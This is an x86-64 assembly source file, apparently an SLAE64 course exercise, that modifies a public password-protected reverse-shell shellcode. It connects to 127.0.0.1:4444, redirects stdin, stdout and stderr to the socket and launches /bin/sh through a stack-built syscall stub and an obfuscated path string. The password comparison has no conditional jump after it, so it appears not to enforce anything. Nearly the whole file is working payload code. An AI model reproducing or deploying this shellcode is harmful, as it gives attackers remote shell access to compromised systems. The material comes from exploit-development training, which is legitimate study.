;original shellcode : http://shell-storm.org/shellcode/files/shellcode-871.php
;Reverse_shell_TCP with password
;modified by Sathish Kumar L SLAE64 - 1408
;original lenght = 138 bytes
;modified length = 135 bytes

global _start

_start:
    
    xor rax, rax    ;Xor function will null the values in the register beacuse we doesn't know whats the value in the register in realtime cases
	xor rsi, rsi 
	mul rsi
	push byte 0x2   ;pusing argument to the stack
	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
	push byte 0x29  ; pushing the syscall number into the rax by using stack
	pop rax
	syscall
	
	; copying the socket descripter from rax to rdi register so that we can use it further 

	xchg rax, rdi
	
	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)
	; setting up the data sctructure
	
	xor rax, rax
	push rax                         ; bzero(&server.sin_zero, 8)
	mov ebx , 0xfeffff80             ; ip address 127.0.0.1 "noted" to remove null
	not ebx
	mov dword [rsp-4], ebx
	sub rsp , 4                      ; adjust the stack
	xor r9, r9
	push word 0x5c11                 ; port 4444 in network byte order
	push word 0x02                   ; AF_INET
	push rsp
	pop rsi
	
	
	push 0x10
	pop rdx
	push 0x2a
	pop rax
	syscall
	
	push 0x3                           
	pop rsi								; setting argument to 3 



duplicate:
    dec esi                            
    mov al, 0x21                       ;duplicate syscall applied to error,output and input using loop
    syscall
    jne duplicate
    
password_check:
	
	push rsp
	pop rsi
	xor rax, rax   ; system read syscall value is 0 so rax is set to 0
	syscall
	push 0x6b636168 ; password to connect to shell is hack which is pushed in reverse and hex encoded
	pop rax
	lea rdi, [rel rsi]
	scasd           ; comparing the user input and stored password in the stack
	
	
execve:                                      
    xor esi, esi
    xor r15, r15
    mov r15w, 0x161f
    sub r15w, 0x1110
    push r15
    mov r15, rsp
    mov rdi, 0xff978cd091969dd0
    inc rdi
    neg rdi
    mul esi
    add al, 0x3b
    push rdi
    push rsp
    pop rdi
    call r15

